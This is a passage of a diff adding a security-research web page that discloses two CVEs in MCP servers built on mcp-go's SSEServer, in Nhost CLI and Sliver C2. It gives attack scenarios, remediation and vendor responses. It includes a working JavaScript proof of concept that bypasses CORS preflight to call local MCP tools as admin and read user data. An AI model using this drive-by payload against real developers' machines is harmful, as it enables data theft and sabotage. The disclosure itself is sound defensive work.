+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <p class="reveal">An attacker who tricks a single operator into clicking a link can silently enumerate the entire
+        operation, exfiltrate collected target data, or mass-delete beacons - permanently severing the team's access to
+        the target network in a single click.</p>
+    </div>
+
+    <!-- 06 -->
+    <div id="s6">
+      <h2 class="reveal"><span class="sec-num">06</span> Side-by-Side Comparison</h2>
+      <div class="reveal">
+        <table>
+          <thead>
+            <tr>
+              <th>Property</th>
+              <th>Nhost CLI</th>
+              <th>Sliver C2</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Default binding</td>
+              <td>stdio (safe)</td>
+              <td>localhost:8080 (exposed)</td>
+            </tr>
+            <tr>
+              <td>Network binding required?</td>
+              <td>Yes - explicit <code>--bind</code> flag</td>
+              <td>No - default when MCP enabled</td>
+            </tr>
+            <tr>
+              <td>CORS policy</td>
+              <td><code>Access-Control-Allow-Origin: *</code></td>
+              <td><code>Access-Control-Allow-Origin: *</code></td>
+            </tr>
+            <tr>
+              <td>Inbound authentication</td>
+              <td>None</td>
+              <td>None</td>
+            </tr>
+            <tr>
+              <td>Content-Type bypass</td>
+              <td>Yes - <code>text/plain</code> works</td>
+              <td>Yes - <code>text/plain</code> works</td>
+            </tr>
+            <tr>
+              <td>Root cause</td>
+              <td>mcp-go SSEServer</td>
+              <td>mcp-go SSEServer</td>
+            </tr>
+            <tr>
+              <td>Severity</td>
+              <td>High</td>
+              <td>High</td>
+            </tr>
+            <tr>
+              <td>CVE</td>
+              <td>CVE-2026-34200</td>
+              <td>CVE-2026-34227</td>
+            </tr>
+            <tr>
+              <td>Patched version</td>
+              <td>v1.41.0</td>
+              <td>In progress</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- 07 -->
+    <div id="s7">
+      <h2 class="reveal"><span class="sec-num">07</span> Attack Scenarios</h2>
+      <div class="scenario-block reveal">
+        <div class="scenario-label">Scenario A - Nhost</div>
+        <div class="scenario-title">Local Development Data Access via Drive-By</div>
+        <p style="margin:0;font-size:.9rem;color:var(--muted)">A Nhost developer running
+          <code>nhost mcp start --bind localhost:8080</code> visits a malicious page. Embedded JavaScript connects to
+          the local MCP server and calls <code>graphql-query</code> with role <code>admin</code>, reading all users and
+          their data from the locally configured project.
+        </p>
+      </div>
+      <div class="scenario-block reveal">
+        <div class="scenario-label">Scenario B - Nhost + Cloud Config</div>
+        <div class="scenario-title">Cloud Data Exfiltration or Sabotage</div>
+        <p style="margin:0;font-size:.9rem;color:var(--muted)">A developer who has run <code>nhost mcp config</code>
+          visits a malicious page while bound to the network. The script calls <code>cloud-graphql-query</code> to read
+          production data, or invokes <code>manage-graphql</code> to execute raw SQL - dropping tables or exfiltrating
+          everything.</p>
+      </div>
+      <div class="scenario-block reveal">
+        <div class="scenario-label">Scenario C - Sliver</div>
+        <div class="scenario-title">Campaign Neutralization in a Single Click</div>
+        <p style="margin:0;font-size:.9rem;color:var(--muted)">A red team operator with Sliver MCP enabled clicks a link
+          to a seemingly benign page. Embedded JavaScript calls <code>list_sessions_and_beacons</code> to enumerate all
+          active implants, then issues <code>fs_rm</code> commands across every target - mass-deleting beacons and
+          permanently severing team access to the target network.</p>
+      </div>
+      <div class="scenario-block reveal">
+        <div class="scenario-label">Scenario D - Sliver (Escalated)</div>
+        <div class="scenario-title">Direct Remote Takeover via 0.0.0.0 Misconfiguration</div>
+        <p style="margin:0;font-size:.9rem;color:var(--muted)">An operator configures the MCP interface to
+          <code>0.0.0.0</code> for team access. An external attacker scans the network, discovers the open port, and
+          directly issues unauthenticated API calls - no browser, no victim interaction, full session control.
+        </p>
+      </div>
+    </div>
+
+    <!-- 08 -->
+    <div id="s8">
+      <h2 class="reveal"><span class="sec-num">08</span> Proof of Concept</h2>
+      <p class="reveal">The following JavaScript, hosted on any domain and visited in a browser on the same machine as
+        the MCP server, demonstrates the full attack chain. It uses the <code>text/plain</code> Content-Type to bypass
+        CORS preflight and invokes the <code>graphql-query</code> tool via the SSE session.</p>
+      <div class="reveal">
+        <span class="code-label">poc.html - works against both Nhost and Sliver</span>
+        <pre><code><span class="hl-comment">&lt;!-- Host on any domain. Visit in browser on same machine as MCP server. --&gt;</span>
+&lt;script&gt;
+  const mcpPort = 8080;
+  const es = new EventSource(`http://localhost:${mcpPort}/sse`);
+
+  es.addEventListener(<span class="hl-green">'endpoint'</span>, (e) =&gt; {
+    <span class="hl-comment">// Capture the session endpoint URL from the SSE stream</span>
+    const endpointUrl = e.data;
+    console.log(<span class="hl-green">'[+] MCP Session:'</span>, endpointUrl);
+
+    const payload = {
+      jsonrpc: <span class="hl-green">"2.0"</span>,
+      id: <span class="hl-green">"1"</span>,
+      method: <span class="hl-green">"tools/call"</span>,
+      params: {
+        name: <span class="hl-green">"graphql-query"</span>,
+        arguments: {
+          subdomain: <span class="hl-green">"local"</span>,
+          role: <span class="hl-green">"admin"</span>,
+          query: <span class="hl-green">"query { users { id email } }"</span>
+        }
+      }
+    };
+
+    fetch(endpointUrl, {
+      method: <span class="hl-green">"POST"</span>,
+      mode: <span class="hl-green">"no-cors"</span>,
+      <span class="hl-comment">// text/plain = Simple Request = no CORS preflight fired</span>
+      headers: { <span class="hl-green">"Content-Type"</span>: <span class="hl-red">"text/plain"</span> },
+      body: JSON.stringify(payload)
+    });
+  });
+
+  es.addEventListener(<span class="hl-green">'message'</span>, (e) =&gt; {
+    const data = JSON.parse(e.data);
+    if (data.result?.content) {
+      <span class="hl-comment">// Data exfiltrated  - readable cross-origin via SSE</span>
+      console.log(<span class="hl-red">"[!] EXFILTRATED:"</span>, data.result.content[0].text);
+    }
+  });
+&lt;/script&gt;</code></pre>
+      </div>
+      <p class="reveal">Full PoC including Sliver-specific payloads: <a
+          href="https://github.com/skoveit/CVE-2026-34227/" target="_blank">github.com/skoveit/CVE-2026-34227</a></p>
+    </div>
+
+    <!-- 09 -->
+    <div id="s9">
+      <h2 class="reveal"><span class="sec-num">09</span> Remediation &amp; Vendor Response</h2>
+      <h3 class="reveal">Nhost - Patched in v1.41.0</h3>
+      <p class="reveal">PR #4060 removes the <code>--bind</code> flag entirely, so only stdio communication is
+        permitted. This is the most conservative fix: it eliminates the attack surface rather than adding authentication
+        on top of it. Users on <code>&lt;= 1.40.0</code> should upgrade immediately.</p>
+      <div class="callout callout-green reveal">
+        <div class="callout-label">Workaround (pre-patch)</div>
+        Do not use <code>nhost mcp start --bind</code>. The default stdio mode is not affected.
+      </div>
+      <h3 class="reveal">Sliver - Fix In Progress</h3>
+      <p class="reveal">The Sliver maintainer (@moloch--) accepted the report and has added inbound authentication
+        tokens, effective regardless of the CORS policy. They are also evaluating switching away from mcp-go's SSEServer
+        entirely.</p>
+      <blockquote class="reveal">
+        "Yea it's not clear to me why such a wide CORS policy is needed, but either way I've added auth tokens which
+        should be effective regardless of the CORS policy."
+        <cite> - @moloch--, Sliver maintainer</cite>
+      </blockquote>
+      <p class="reveal">One pattern worth noting: <strong>Grafana Tempo</strong> also uses mcp-go, but wraps it with
+        <code>StreamableHTTPServer</code> instead of <code>SSEServer</code> and applies their own authentication
+        middleware around the whole thing - a design that avoids the SSE CORS issue entirely.
+      </p>
+    </div>
+
+    <!-- 10 -->
+    <div id="s10">
+      <h2 class="reveal"><span class="sec-num">10</span> The Broader MCP Security Problem</h2>
+      <p class="reveal">These two findings are unlikely to be isolated. The conditions that create this vulnerability -
+        mcp-go's SSEServer, no inbound auth, a developer running the process locally - are the default integration
+        pattern for a large number of MCP server implementations.</p>
+      <p class="reveal">The mcp-go maintainers closed the origin validation feature request (<a
+          href="https://github.com/mark3labs/mcp-go/issues/475" target="_blank">mark3labs/mcp-go#475</a>) as not
+        planned. This means every project using <code>SSEServer</code> from this library is relying on application-level
+        mitigations that many developers simply haven't added.</p>
+      <h3 class="reveal">If You Run an MCP Server Locally, Ask Yourself:</h3>
+      <ul class="reveal">
+        <li>Is it bound to a network port, or stdio only? (<strong>stdio is safe</strong>)</li>
+        <li>If network-bound, does it require an inbound auth token?</li>
+        <li>What CORS policy does your MCP library apply on the SSE handler specifically?</li>
+        <li>What can an unauthenticated caller do with any exposed tool?</li>
+        <li>If misconfigured to <code>0.0.0.0</code>, what is the blast radius?</li>
+      </ul>
+      <div class="callout callout-red reveal">
+        <div class="callout-label">Bottom Line</div>
+        The MCP ecosystem is moving fast and security tooling hasn't caught up. The SSE transport creates a subtle
+        attack surface that's easy to miss - especially because the standard HTTP handler in the same library is fine.
+        Until upstream fixes land and propagate, treat any network-bound MCP server as an unauthenticated local service
+        reachable by any website your browser visits.
+      </div>
+      <hr>
+      <h3 class="reveal">Advisories &amp; References</h3>
+      <ul class="reveal">
+        <li><a href="https://github.com/nhost/nhost/security/advisories/GHSA-6c5x-3h35-vvw2"
+            target="_blank">GHSA-6c5x-3h35-vvw2</a> - Nhost CLI · CVE-2026-34200 · High</li>
+        <li><a href="https://github.com/BishopFox/sliver/security/advisories/GHSA-6fpf-248c-m7wm"
+            target="_blank">GHSA-6fpf-248c-m7wm</a> - Sliver C2 · CVE-2026-34227 · High</li>
+        <li><a href="https://github.com/skoveit/CVE-2026-34200" target="_blank">github.com/skoveit/CVE-2026-34200</a> -
+          Nhost PoC</li>
+        <li><a href="https://github.com/skoveit/CVE-2026-34227" target="_blank">github.com/skoveit/CVE-2026-34227</a> -
+          Sliver PoC</li>
+        <li><a href="https://github.com/mark3labs/mcp-go/issues/475" target="_blank">mark3labs/mcp-go#475</a> -
+          Origin validation feature request</li>
+      </ul>
+    </div>
+
+    <!-- Read More -->
+    <div class="read-more reveal">
+      <h3>Read More Research</h3>
+      <div class="cve-grid">
+        <a href="../C2/Sliver-UnoReverse">
+          <div class="cve-card high">
+            <div class="cve-card-id">C2 SECURITY</div>
+            <div class="cve-card-title">Sliver: Uno Reverse</div>
+            <p class="cve-card-desc">Analyzing unauthenticated RCE potential and offensive research in the Sliver C2
+              framework.</p>
+          </div>
+        </a>
+        <a href="../web/FTPbox">
+          <div class="cve-card moderate">
+            <div class="cve-card-id">VULNERABILITY RESEARCH</div>
+            <div class="cve-card-title">FTPbox: Auth Bypass</div>
+            <p class="cve-card-desc">Discovery of hardcoded admin credentials in a popular file synchronization client.
+            </p>
+          </div>
+        </a>
+      </div>
+    </div>
+
+  </main>
+
+  <footer>Security Research · March 2026 · skoveit</footer>
+
+  <script>
+    const SECTIONS = ['s1', 's2', 's3', 's4', 's5', 's6', 's7', 's8', 's9', 's10'];
+    const dots = document.querySelectorAll('.nav-dot');
+
+    // ── Scroll reveal
+    const ro = new IntersectionObserver(entries => {
+      entries.forEach(e => {
+        if (e.isIntersecting) { e.target.classList.add('in-view'); ro.unobserve(e.target); }
+      });
+    }, { threshold: 0.07 });
+    document.querySelectorAll('.reveal').forEach(el => ro.observe(el));
+
+    // ── Nav dots click
+    dots.forEach((dot, i) => {
+      dot.addEventListener('click', () => {
+        const t = document.getElementById(SECTIONS[i]);
+        if (t) t.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      });
+    });
+
+    // ── Nav dots active state
+    const so = new IntersectionObserver(entries => {
+      entries.forEach(e => {
+        if (e.isIntersecting) {
+          const idx = SECTIONS.indexOf(e.target.id);
+          if (idx !== -1) {
+            dots.forEach(d => d.classList.remove('active'));
+            dots[idx].classList.add('active');
+          }
+        }
+      });
+    }, { threshold: 0.35 });
+    SECTIONS.forEach(id => { const el = document.getElementById(id); if (el) so.observe(el); });
+  </script>
+</body>
+
+</html>
